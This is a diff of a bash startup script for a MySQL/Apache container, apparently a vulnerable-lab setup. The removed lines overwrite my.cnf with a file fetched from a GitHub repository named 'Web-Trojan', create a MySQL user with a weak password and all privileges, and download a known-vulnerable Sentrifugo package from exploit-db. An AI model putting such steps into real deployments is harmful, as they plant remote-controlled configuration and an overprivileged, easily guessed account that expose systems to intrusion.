@@ -1,3 +1,4 @@
+  GNU nano 4.5                                                                     r.sh                                                                               
 #!/bin/bash
 
 VOLUME_HOME="/var/lib/mysql"
@@ -7,20 +8,9 @@ sed -ri -e "s/^upload_max_filesize.*/upload_max_filesize = ${PHP_UPLOAD_MAX_FILE
 if [[ ! -d $VOLUME_HOME/mysql ]]; then
     echo "=> An empty or uninitialized MySQL volume is detected in $VOLUME_HOME"
     echo "=> Installing MySQL ..."
-    apt-get update
-    apt-get install wget
-    rm /etc/mysql/my.cnf
-    service apache2 start
-    wget https://raw.githubusercontent.com/cipher1234/Web-Trojan/master/my.cnf -O /etc/mysql/my.cnf
     mysql_install_db > /dev/null 2>&1
     echo "=> Done!"  
-    sleep 5
-    mysql -uroot -e "CREATE USER 'user'@'%' IDENTIFIED BY 'password'"
-    mysql -uroot -e "GRANT ALL PRIVILEGES ON *.* TO 'user'@'password' WITH GRANT OPTION"
-    wget https://www.exploit-db.com/apps/f1f20b078f2a39a8e5e046fdc7eb4be7-Sentrifugo.zip -O /app
-    apt-get install unzip
-    unzip /app/*.zip
-    rm /app/*
+    /create_mysql_admin_user.sh
 else
     echo "=> Using an existing volume of MySQL"
 fi
